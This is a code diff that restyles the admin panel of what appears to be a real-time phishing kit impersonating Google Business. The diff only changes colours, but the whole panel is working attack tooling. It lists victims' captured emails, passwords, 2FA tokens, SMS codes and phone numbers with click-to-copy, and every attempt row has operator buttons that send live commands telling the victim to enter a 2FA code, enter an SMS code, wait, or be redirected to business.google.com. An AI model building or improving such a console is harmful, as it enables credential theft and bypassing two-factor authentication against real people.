@@ -226,44 +226,44 @@ function AdminPanel() {
   // Tela de login se não autenticado
   if (!isAuthenticated) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-purple-600 to-indigo-700 flex items-center justify-center p-4">
-        <div className="bg-white rounded-2xl shadow-2xl p-8 w-full max-w-md">
+      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
+        <div className="bg-[#111111] border border-green-900/30 rounded-2xl shadow-2xl shadow-green-900/10 p-8 w-full max-w-md">
           <div className="text-center mb-8">
-            <h1 className="text-3xl font-bold text-gray-900 mb-2">Admin Panel</h1>
-            <p className="text-gray-600">Entre com suas credenciais</p>
+            <h1 className="text-3xl font-bold text-green-400 mb-2">Admin Panel</h1>
+            <p className="text-gray-500">Entre com suas credenciais</p>
           </div>
 
           <form onSubmit={handleAdminLogin} className="space-y-6">
             <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
+              <label className="block text-sm font-medium text-green-400/80 mb-2">
                 Usuário
               </label>
               <input
                 type="text"
                 value={username}
                 onChange={(e) => setUsername(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all"
+                className="w-full px-4 py-3 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600 transition-all"
                 placeholder="donas"
                 required
               />
             </div>
 
             <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
+              <label className="block text-sm font-medium text-green-400/80 mb-2">
                 Senha
               </label>
               <input
                 type="password"
                 value={loginPassword}
                 onChange={(e) => setLoginPassword(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent transition-all"
+                className="w-full px-4 py-3 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600 transition-all"
                 placeholder="••••••••"
                 required
               />
             </div>
 
             {loginError && (
-              <div className="bg-red-50 text-red-600 px-4 py-3 rounded-lg text-sm">
+              <div className="bg-red-900/30 border border-red-500/30 text-red-400 px-4 py-3 rounded-lg text-sm">
                 {loginError}
               </div>
             )}
@@ -271,7 +271,7 @@ function AdminPanel() {
             <button
               type="submit"
               disabled={loginLoading}
-              className="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold hover:bg-purple-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+              className="w-full bg-green-900/40 text-green-400 border border-green-500/40 py-3 rounded-lg font-semibold hover:bg-green-900/60 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
             >
               {loginLoading ? "Entrando..." : "Entrar"}
             </button>
@@ -282,34 +282,34 @@ function AdminPanel() {
   }
 
   return (
-    <div className="min-h-screen bg-gray-50">
+    <div className="min-h-screen bg-[#0a0a0a]">
       {/* Header */}
-      <header className="bg-gradient-to-r from-purple-600 to-purple-700 shadow-lg">
+      <header className="bg-[#111111] border-b border-green-900/40 shadow-lg shadow-green-900/10">
         <div className="container mx-auto px-4 py-4">
           <div className="flex items-center justify-between flex-wrap gap-4">
             <div className="flex items-center gap-2 flex-wrap">
-              <button className="bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
+              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-orange-400 border border-orange-500/30 px-4 py-2 rounded text-sm font-medium transition-colors">
                 TXT
               </button>
-              <button className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
+              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-blue-400 border border-blue-500/30 px-4 py-2 rounded text-sm font-medium transition-colors">
                 PDF
               </button>
-              <button className="bg-blue-400 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
+              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-cyan-400 border border-cyan-500/30 px-4 py-2 rounded text-sm font-medium transition-colors">
                 Telegram
               </button>
               <button
                 onClick={handleClearAll}
-                className="bg-red-500 hover:bg-red-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
+                className="bg-[#1a1a1a] hover:bg-red-900/40 text-red-400 border border-red-500/30 px-4 py-2 rounded text-sm font-medium transition-colors"
               >
                 Limpar Tudo
               </button>
               <button
                 onClick={fetchLoginAttempts}
-                className="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors"
+                className="bg-green-900/30 hover:bg-green-900/50 text-green-400 border border-green-500/40 px-4 py-2 rounded text-sm font-medium transition-colors"
               >
                 Atualizar
               </button>
-              <button className="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded text-sm font-medium transition-colors">
+              <button className="bg-[#1a1a1a] hover:bg-[#252525] text-purple-400 border border-purple-500/30 px-4 py-2 rounded text-sm font-medium transition-colors">
                 Exibir Visitantes
               </button>
             </div>
@@ -321,11 +321,11 @@ function AdminPanel() {
               />
               <button
                 onClick={handleLogout}
-                className="bg-white text-purple-600 px-4 py-2 rounded text-sm font-medium hover:bg-gray-100 transition-colors"
+                className="bg-[#1a1a1a] hover:bg-[#252525] text-gray-300 border border-gray-600/40 px-4 py-2 rounded text-sm font-medium transition-colors"
               >
                 Sair
               </button>
-              <button className="bg-yellow-400 text-black px-4 py-2 rounded text-sm font-bold hover:bg-yellow-500 transition-colors">
+              <button className="bg-green-500/20 text-green-400 border border-green-500/50 px-4 py-2 rounded text-sm font-bold hover:bg-green-500/30 transition-colors">
                 DONAS
               </button>
             </div>
@@ -335,11 +335,11 @@ function AdminPanel() {
 
       {/* Content */}
       <div className="container mx-auto px-4 py-8">
-        <div className="bg-white rounded-lg shadow-md p-6">
+        <div className="bg-[#111111] rounded-lg border border-green-900/30 p-6">
           {/* Search */}
           <div className="mb-6 grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
+              <label className="block text-sm font-medium text-green-400/80 mb-2">
                 Campo de referência:
               </label>
               <input
@@ -347,11 +347,11 @@ function AdminPanel() {
                 value={referenceField}
                 onChange={(e) => setReferenceField(e.target.value)}
                 placeholder="Ex: final do telefone, nome..."
-                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
+                className="w-full px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600"
               />
             </div>
             <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
+              <label className="block text-sm font-medium text-green-400/80 mb-2">
                 Site de Redirecionamento (Comando close):
               </label>
               <div className="flex gap-2">
@@ -360,7 +360,7 @@ function AdminPanel() {
                   value={redirectUrl}
                   onChange={(e) => setRedirectUrl(e.target.value)}
                   placeholder="https://business.google.com/"
-                  className="flex-1 px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
+                  className="flex-1 px-4 py-2 bg-[#0a0a0a] border border-green-900/40 rounded-lg focus:ring-2 focus:ring-green-500/50 focus:border-green-500/50 text-green-100 placeholder-gray-600"
                 />
               </div>
             </div>
@@ -369,8 +369,8 @@ function AdminPanel() {
           {/* Loading */}
           {loading ? (
             <div className="text-center py-12">
-              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-purple-600"></div>
-              <p className="mt-4 text-gray-600">Carregando...</p>
+              <div className="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-green-500"></div>
+              <p className="mt-4 text-green-400/60">Carregando...</p>
             </div>
           ) : loginAttempts.length === 0 ? (
             <div className="text-center py-12">
@@ -383,10 +383,10 @@ function AdminPanel() {
                 const totalAttempts = 1 + (attempt.attempts ? attempt.attempts.length : 0);
                 
                 return (
-                  <div key={attempt.id} className="border border-gray-200 rounded-lg overflow-hidden shadow-sm">
+                  <div key={attempt.id} className="border border-green-900/30 rounded-lg overflow-hidden">
                     {/* Header com email e número de tentativas */}
-                    <div className="bg-gradient-to-r from-blue-400 to-blue-500 px-4 py-3 text-white">
-                      <h3 className="font-bold text-lg">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
+                    <div className="bg-[#0d1f0d] border-b border-green-900/40 px-4 py-3">
+                      <h3 className="font-bold text-lg text-green-400">{attempt.email} ({totalAttempts} tentativa{totalAttempts > 1 ? 's' : ''})</h3>
                     </div>
 
                     {/* Tabela */}
@@ -394,101 +394,101 @@ function AdminPanel() {
                       <table className="w-full border-collapse">
                       <thead>
                         <tr>
-                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">#</th>
-                          <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">status</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-gray-400 border border-[#2a2a2a]">#</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-gray-400 border border-[#2a2a2a]">status</th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "INV")}
-                            className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-purple-200 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-red-400 border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                             title="Clique para avisar que dados estão incorretos"
                           >
                             INV
                           </th>
-                          <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">USUÁRIO/LOGIN</th>
-                          <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">SENHA</th>
-                          <th className="border border-gray-300 p-0">
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-yellow-400 border border-[#2a2a2a]">USUÁRIO/LOGIN</th>
+                          <th className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-green-400 border border-[#2a2a2a]">SENHA</th>
+                          <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "AUT")}
-                                className="bg-blue-100 px-2 py-2 text-xs font-bold text-gray-700 cursor-pointer hover:bg-blue-200 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-cyan-400 cursor-pointer hover:bg-cyan-900/30 transition-colors flex-1"
                                 title="Clique para pedir código 2FA"
                               >
                                 AUT
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "AUT")}
-                                className="bg-red-400 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-500 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar código 2FA"
                               >
                                 X
                               </div>
                             </div>
                           </th>
-                          <th className="border border-gray-300 p-0">
+                          <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "EMAIL")}
-                                className="bg-purple-100 px-2 py-2 text-xs font-bold text-gray-700 cursor-pointer hover:bg-purple-200 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-purple-400 cursor-pointer hover:bg-purple-900/30 transition-colors flex-1"
                                 title="Clique para pedir email cadastrado"
                               >
                                 EMAIL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "EMAIL")}
-                                className="bg-red-400 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-500 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar email"
                               >
                                 X
                               </div>
                             </div>
                           </th>
-                          <th className="border border-gray-300 p-0">
+                          <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "TOK-TEL")}
-                                className="bg-orange-100 px-2 py-2 text-xs font-bold text-gray-700 cursor-pointer hover:bg-orange-200 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-orange-400 cursor-pointer hover:bg-orange-900/30 transition-colors flex-1"
                                 title="Clique para pedir código do telefone"
                               >
                                 TOK-TEL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "TOK-TEL")}
-                                className="bg-red-400 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-500 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar código SMS"
                               >
                                 X
                               </div>
                             </div>
                           </th>
-                          <th className="border border-gray-300 p-0">
+                          <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "TELEFONE")}
-                                className="bg-green-100 px-2 py-2 text-xs font-bold text-gray-700 cursor-pointer hover:bg-green-200 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-green-400 cursor-pointer hover:bg-green-900/30 transition-colors flex-1"
                                 title="Clique para pedir número de telefone"
                               >
                                 Nº TEL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "TELEFONE")}
-                                className="bg-red-400 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-500 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar telefone"
                               >
                                 X
                               </div>
                             </div>
                           </th>
-                          <th className="border border-gray-300 p-0">
+                          <th className="border border-[#2a2a2a] p-0">
                             <div className="flex">
                               <div 
                                 onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
-                                className="bg-blue-100 px-2 py-2 text-xs font-bold text-gray-700 cursor-pointer hover:bg-blue-200 transition-colors flex-1"
+                                className="bg-[#1a1a1a] px-2 py-2 text-xs font-bold text-blue-400 cursor-pointer hover:bg-blue-900/30 transition-colors flex-1"
                                 title="Clique para pedir token do email"
                               >
                                 TOK-MAIL
                               </div>
                               <div 
                                 onClick={() => sendInvalidCommand(attempt.id, "TOK-MAIL")}
-                                className="bg-red-400 px-2 py-2 text-xs font-bold text-white cursor-pointer hover:bg-red-500 transition-colors"
+                                className="bg-red-900/40 px-2 py-2 text-xs font-bold text-red-400 cursor-pointer hover:bg-red-900/60 transition-colors"
                                 title="Invalidar token do email"
                               >
                                 X
@@ -497,21 +497,21 @@ function AdminPanel() {
                           </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "AGUARDE")}
-                            className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-yellow-200 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-yellow-400 border border-[#2a2a2a] cursor-pointer hover:bg-yellow-900/30 transition-colors"
                             title="Clique para colocar em aguarde"
                           >
                             👍
                           </th>
                           <th 
                             onClick={() => sendCommand(attempt.id, "REDIRECT")}
-                            className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-pink-200 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-pink-400 border border-[#2a2a2a] cursor-pointer hover:bg-pink-900/30 transition-colors"
                             title="Clique para redirecionar usuário"
                           >
                             Close
                           </th>
                           <th 
                             onClick={() => deleteAttempt(attempt.id)}
-                            className="bg-red-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300 cursor-pointer hover:bg-red-200 transition-colors"
+                            className="bg-[#1a1a1a] px-3 py-2 text-xs font-bold text-red-400 border border-[#2a2a2a] cursor-pointer hover:bg-red-900/30 transition-colors"
                             title="Excluir este card"
                           >
                             🗑️
@@ -520,117 +520,117 @@ function AdminPanel() {
                       </thead>
                       <tbody>
                         {/* Única linha de dados */}
-                        <tr className="bg-white">
+                        <tr className="bg-[#0f0f0f]">
                           {/* # */}
-                          <td className="px-3 py-3 text-center text-sm font-bold border border-gray-300">{index + 1}</td>
+                          <td className="px-3 py-3 text-center text-sm font-bold text-green-300 border border-[#2a2a2a]">{index + 1}</td>
                           
                           {/* status - bolinha clicável */}
-                          <td className="px-3 py-3 text-center border border-gray-300">
+                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                             <button
                               onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
                               className="inline-flex items-center justify-center"
                             >
-                              <span className={`w-4 h-4 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
+                              <span className={`w-4 h-4 rounded-full ${attempt.status === "online" ? "bg-green-500 shadow-lg shadow-green-500/50" : "bg-red-500 shadow-lg shadow-red-500/50"}`}></span>
                             </button>
                           </td>
                           
                           {/* INV - apenas header, célula vazia */}
-                          <td className="px-3 py-3 text-center border border-gray-300">
-                            <span className="text-gray-700">-</span>
+                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
+                            <span className="text-gray-600">-</span>
                           </td>
                           
                           {/* USUÁRIO/LOGIN - valor fixo - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-sm border border-gray-300 font-medium cursor-pointer hover:bg-yellow-50 transition-colors"
+                            className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium cursor-pointer hover:bg-green-900/20 transition-colors text-green-100"
                             onClick={() => copyToClipboard(attempt.email, `email-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `email-${attempt.id}` ? "text-green-600" : ""}>
+                            <span className={copiedField === `email-${attempt.id}` ? "text-green-400" : ""}>
                               {copiedField === `email-${attempt.id}` ? "✓ Copiado!" : attempt.email}
                             </span>
                           </td>
                           
                           {/* SENHA - valor fixo - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-sm border border-gray-300 cursor-pointer hover:bg-green-50 transition-colors"
+                            className="px-3 py-3 text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors text-green-100"
                             onClick={() => copyToClipboard(attempt.password, `password-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `password-${attempt.id}` ? "text-green-600" : ""}>
+                            <span className={copiedField === `password-${attempt.id}` ? "text-green-400" : ""}>
                               {copiedField === `password-${attempt.id}` ? "✓ Copiado!" : (attempt.password || "-")}
                             </span>
                           </td>
                           
                           {/* AUT - campo esperando dado - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-blue-50 transition-colors"
+                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                             onClick={() => copyToClipboard(attempt.token_2fa, `token2fa-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `token2fa-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                            <span className={copiedField === `token2fa-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                               {copiedField === `token2fa-${attempt.id}` ? "✓ Copiado!" : (attempt.token_2fa || "-")}
                             </span>
                           </td>
                           
                           {/* EMAIL - campo esperando dado - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-purple-50 transition-colors"
+                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                             onClick={() => copyToClipboard(attempt.email_input, `emailinput-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `emailinput-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                            <span className={copiedField === `emailinput-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                               {copiedField === `emailinput-${attempt.id}` ? "✓ Copiado!" : (attempt.email_input || "-")}
                             </span>
                           </td>
                           
                           {/* TOK-TEL - campo esperando dado - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-orange-50 transition-colors"
+                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                             onClick={() => copyToClipboard(attempt.sms_code, `smscode-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `smscode-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                            <span className={copiedField === `smscode-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                               {copiedField === `smscode-${attempt.id}` ? "✓ Copiado!" : (attempt.sms_code || "-")}
                             </span>
                           </td>
                           
                           {/* Nº TELEFONE - campo esperando dado - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-green-50 transition-colors"
+                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                             onClick={() => copyToClipboard(attempt.phone_number, `phone-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `phone-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                            <span className={copiedField === `phone-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                               {copiedField === `phone-${attempt.id}` ? "✓ Copiado!" : (attempt.phone_number || "-")}
                             </span>
                           </td>
                           
                           {/* TOK-MAIL - campo esperando dado - COPIÁVEL */}
                           <td 
-                            className="px-3 py-3 text-center text-sm border border-gray-300 cursor-pointer hover:bg-blue-50 transition-colors"
+                            className="px-3 py-3 text-center text-sm border border-[#2a2a2a] cursor-pointer hover:bg-green-900/20 transition-colors"
                             onClick={() => copyToClipboard(attempt.app_mail, `appmail-${attempt.id}`)}
                             title="Clique para copiar"
                           >
-                            <span className={copiedField === `appmail-${attempt.id}` ? "text-green-600" : "text-gray-700"}>
+                            <span className={copiedField === `appmail-${attempt.id}` ? "text-green-400" : "text-gray-400"}>
                               {copiedField === `appmail-${attempt.id}` ? "✓ Copiado!" : (attempt.app_mail || "-")}
                             </span>
                           </td>
                           
                           {/* 👍 - apenas header, célula vazia */}
-                          <td className="px-3 py-3 text-center border border-gray-300">
-                            <span className="text-gray-700">-</span>
+                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
+                            <span className="text-gray-600">-</span>
                           </td>
                           
                           {/* X - apenas header, célula vazia */}
-                          <td className="px-3 py-3 text-center border border-gray-300">
-                            <span className="text-gray-700">-</span>
+                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
+                            <span className="text-gray-600">-</span>
                           </td>
                           
                           {/* 🗑️ - lixeira clicável */}
-                          <td className="px-3 py-3 text-center border border-gray-300">
+                          <td className="px-3 py-3 text-center border border-[#2a2a2a]">
                             <button
                               onClick={() => handleDelete(attempt.id)}
-                              className="text-gray-600 hover:text-gray-800 text-xl transition-colors"
+                              className="text-red-500/60 hover:text-red-400 text-xl transition-colors"
                             >
                               🗑️
                             </button>
@@ -639,35 +639,35 @@ function AdminPanel() {
                         
                         {/* Tentativas adicionais */}
                         {attempt.attempts && attempt.attempts.map((additionalAttempt, attemptIndex) => (
-                          <tr key={attemptIndex} className="bg-yellow-50">
+                          <tr key={attemptIndex} className="bg-[#0a0f0a]">
                             {/* # */}
-                            <td className="px-3 py-3 text-center text-sm font-bold border border-gray-300">{attemptIndex + 2}</td>
+                            <td className="px-3 py-3 text-center text-sm font-bold text-green-300/70 border border-[#2a2a2a]">{attemptIndex + 2}</td>
                             
                             {/* status - vazio */}
-                            <td className="px-3 py-3 text-center border border-gray-300">
-                              <span className="w-4 h-4 rounded-full bg-gray-300 inline-block"></span>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
+                              <span className="w-4 h-4 rounded-full bg-gray-700 inline-block"></span>
                             </td>
                             
                             {/* INV - vazio */}
-                            <td className="px-3 py-3 text-center border border-gray-300">
-                              <span className="text-gray-700">-</span>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a]">
+                              <span className="text-gray-600">-</span>
                             </td>
                             
                             {/* USUÁRIO/LOGIN - nova tentativa */}
-                            <td className="px-3 py-3 text-sm border border-gray-300 font-medium">{additionalAttempt.email}</td>
+                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] font-medium text-green-100/70">{additionalAttempt.email}</td>
                             
                             {/* SENHA - nova tentativa */}
-                            <td className="px-3 py-3 text-sm border border-gray-300">{additionalAttempt.password || "-"}</td>
+                            <td className="px-3 py-3 text-sm border border-[#2a2a2a] text-green-100/70">{additionalAttempt.password || "-"}</td>
                             
                             {/* Demais campos vazios */}
-                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center text-sm border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center border border-gray-300">-</td>
-                            <td className="px-3 py-3 text-center border border-gray-300">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center text-sm border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
+                            <td className="px-3 py-3 text-center border border-[#2a2a2a] text-gray-600">-</td>
                           </tr>
                         ))}
                       </tbody>
@@ -675,12 +675,12 @@ function AdminPanel() {
                   </div>
 
                   {/* Footer com informações */}
-                  <div className="bg-gray-50 px-4 py-3 text-xs text-gray-600 border-t border-gray-200">
+                  <div className="bg-[#0a0a0a] px-4 py-3 text-xs text-green-400/60 border-t border-[#2a2a2a]">
                     <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
-                      <div><span className="font-semibold">🌐 IP:</span> {attempt.ip_address || "-"}</div>
-                      <div><span className="font-semibold">🌍 País:</span> {attempt.country || "-"}</div>
-                      <div><span className="font-semibold">💻 Dispositivo:</span> {attempt.device || "Desktop"}</div>
-                      <div><span className="font-semibold">📄 Página atual:</span> {attempt.page || "Página Loading..."}</div>
+                      <div><span className="font-semibold text-green-400/80">IP:</span> {attempt.ip_address || "-"}</div>
+                      <div><span className="font-semibold text-green-400/80">País:</span> {attempt.country || "-"}</div>
+                      <div><span className="font-semibold text-green-400/80">Dispositivo:</span> {attempt.device || "Desktop"}</div>
+                      <div><span className="font-semibold text-green-400/80">Página atual:</span> {attempt.page || "Página Loading..."}</div>
                     </div>
                   </div>
                 </div>
